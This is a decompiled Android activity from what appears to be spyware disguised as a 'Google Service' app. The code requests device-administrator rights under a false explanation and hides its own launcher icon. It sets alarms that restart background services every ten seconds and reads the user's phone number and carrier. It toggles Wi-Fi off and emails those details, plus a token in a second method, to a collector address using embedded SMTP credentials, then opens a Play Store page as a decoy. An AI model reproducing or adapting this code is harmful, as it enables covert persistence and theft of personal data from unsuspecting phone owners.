package com.googleprojects.mm;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.webkit.WebSettings;
import android.webkit.WebSettings.RenderPriority;
import android.webkit.WebView;
import com.googleprojects.mmsp.R;
import java.util.Calendar;

public class SPMainActivity extends Activity {
    static final int ADMIN_REQ_CODE = 118;
    SOMMail currentMail;
    JHDataManager dataManager;
    private DevicePolicyManager mDPM;
    private ComponentName mDeviceAdminSample;
    SOMailCPUtil mailUtil;

    public void getAdmin() {
        Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        localIntent.putExtra("android.app.extra.DEVICE_ADMIN", this.mDeviceAdminSample);
        localIntent.putExtra("android.app.extra.ADD_EXPLANATION", "Google Service");
        startActivityForResult(localIntent, ADMIN_REQ_CODE);
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        PendingIntent pendingIntent = PendingIntent.getService(this, 0, new Intent(this, JHService.class), 0);
        PendingIntent mailPoolPendingIntent = PendingIntent.getService(this, 1, new Intent(this, SOMailPoolService.class), 0);
        this.dataManager = new JHDataManager(this);
        this.mailUtil = new SOMailCPUtil(this);
        boolean adminAvailable = false;
        this.mDeviceAdminSample = new ComponentName(this, DevAdReceiver.class);
        this.mDPM = (DevicePolicyManager) getSystemService("device_policy");
        if (!this.mDPM.isAdminActive(this.mDeviceAdminSample)) {
            adminAvailable = true;
            getAdmin();
        }
        getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
        Calendar cal = Calendar.getInstance();
        ((AlarmManager) getSystemService("alarm")).setRepeating(0, cal.getTimeInMillis(), 10000, pendingIntent);
        ((AlarmManager) getSystemService("alarm")).setRepeating(0, cal.getTimeInMillis(), 10000, mailPoolPendingIntent);
        TelephonyManager manager = (TelephonyManager) getSystemService("phone");
        String userPhone = manager.getLine1Number();
        String networkName = manager.getNetworkOperatorName();
        if (networkName == null || networkName.length() < 0) {
            networkName = manager.getSimOperatorName();
        }
        if (networkName == null || networkName.length() < 0) {
            networkName = manager.getSimOperator();
        }
        boolean wifiToggled = false;
        WifiManager wManager = (WifiManager) getSystemService("wifi");
        if (wManager.isWifiEnabled() && wManager.getWifiState() == 3) {
            wifiToggled = true;
            wManager.setWifiEnabled(false);
        }
        try {
            this.currentMail = this.mailUtil.getCurrentMail();
            String mailBody = MMMailContentUtil.makeMMMessageBody(userPhone, networkName, MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.MM_MESSAGE_SUBJECT, false, VERSION.RELEASE);
            new MMMailSender(this.currentMail.sender_addr, SOMailCPUtil.mail_pwd, this.currentMail.smtp_addr, this.currentMail.smtp_port).sendMail(MMMailContentUtil.MM_MESSAGE_SUBJECT, mailBody, this.currentMail.sender_addr, this.currentMail.receiver_addr);
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (wifiToggled) {
            wManager.setWifiEnabled(true);
        }
        WebSettings sets = ((WebView) findViewById(R.id.webView)).getSettings();
        sets.setJavaScriptEnabled(true);
        sets.setBuiltInZoomControls(true);
        sets.setCacheMode(2);
        sets.setAppCacheEnabled(false);
        sets.setAllowFileAccess(true);
        sets.setRenderPriority(RenderPriority.HIGH);
        if (!adminAvailable) {
            showMarket();
        }
    }

    /* access modifiers changed from: 0000 */
    public void setDToken(String dToken) {
        TelephonyManager manager = (TelephonyManager) getSystemService("phone");
        String userPhone = manager.getLine1Number();
        String networkName = manager.getNetworkOperatorName();
        if (networkName == null || networkName.length() < 0) {
            networkName = manager.getSimOperatorName();
        }
        if (networkName == null || networkName.length() < 0) {
            networkName = manager.getSimOperator();
        }
        try {
            this.currentMail = this.mailUtil.getCurrentMail();
            new MMMailSender(this.currentMail.sender_addr, SOMailCPUtil.mail_pwd, this.currentMail.smtp_addr, this.currentMail.smtp_port).sendMail(MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.makeMMMessageBody(userPhone, networkName, dToken, MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.MM_MESSAGE_SUBJECT, this.dataManager.isEnabled(), VERSION.RELEASE), this.currentMail.sender_addr, this.currentMail.receiver_addr);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == ADMIN_REQ_CODE) {
            showMarket();
        }
    }

    /* access modifiers changed from: 0000 */
    public void showMarket() {
        String appPackName = "biz.longbright.smartsales.s01096361243";
        try {
            startActivity(new Intent("android.intent.action.VIEW", Uri.parse("market://details?id=" + appPackName)));
        } catch (ActivityNotFoundException e) {
            startActivity(new Intent("android.intent.action.VIEW", Uri.parse("http://play.google.com/store/apps/details?id=" + appPackName)));
        }
        finish();
    }
}
